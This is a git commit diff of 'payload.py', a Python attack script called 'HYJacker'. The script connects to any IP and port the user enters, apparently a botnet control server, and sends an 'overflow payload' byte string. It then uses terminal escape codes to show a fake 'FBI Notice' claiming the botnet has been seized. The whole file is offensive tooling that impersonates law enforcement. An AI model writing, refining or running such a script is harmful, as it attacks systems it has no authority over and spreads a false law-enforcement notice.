5df95dc00bffee9dab63d11ab73ab0b0060fed33
IoT <147968485+iotwar@users.noreply.github.com>
2023-10-15 05:00:09 -0500

    Update payload.py
    Fixed payload, More stable now

--- payload.py
+++ payload.py
@@ -6,7 +6,7 @@ client_socket.connect((input("IP: "), int(input("Port: "))))
 version = "fbi"
 try:
     print("[HYJacker] Sending OverFlow Payload..")
-    client_socket.sendall(b'\0x04int []\0x0A\0x12\0x34\0x50\0x36;Device Connected; \0x34')
+    client_socket.sendall(b'\x04int []\x0A\x12\x34\x50\x36;Device Connected; \x34')
     client_socket.sendall(b'\r\n\033\\0x20#EXPLOIT WAS SUCCESSFUL!#\033[34m[IoT] St0p using QB0TS!r\n')
     time.sleep(1)
     if version == "fbi":client_socket.sendall('\r\n\033[2J\033[H\033[0;104mFBI Notice!\033[0;0m \r\033[1B\033[4;91mThis BotNet Has Been Seized. \r\033[1BAll Traffic Coming In And Out Is Now Monitored.\033[0;0m\033[1D\033[1C\033[1B\r\n⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀\r\n⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄\r\n⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄\r\n⠀⠀⢠⣿⡿⠿⠿⠿⠿⠿⠿⠿⣿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⠿⠿⢿⣿\r\n⠀⢀⣿⣿⡇⠀⠀⣠⣤⣄⣀⣠⣿⠀⠀⢀⣤⣀⡀⠀⠘⣿⣿⠀⠀⢸⣿⣿\r\n⠀⢸⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⠟⠀⠀⣿⣿⠀⠀⢸⣿⣿\r\n⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⠀⠀⢸⣿⣿⡧\r\n⠀⢸⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⣿⠀⠀⢹⣿⠀⠀⢸⣿⣿\r\n⠀⠈⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⠈⠛⠛⠉⠀⢀⣾⣿⠀⠀⢸⣿⣿\r\n⠀⠀⠸⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣶⣶⣾⣿\r\n⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋\r\n⠀⠀⠀⠀⠀⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁\r\n⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋\r\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠋⠉⠉\r\n\r\n'.encode('utf-8'))
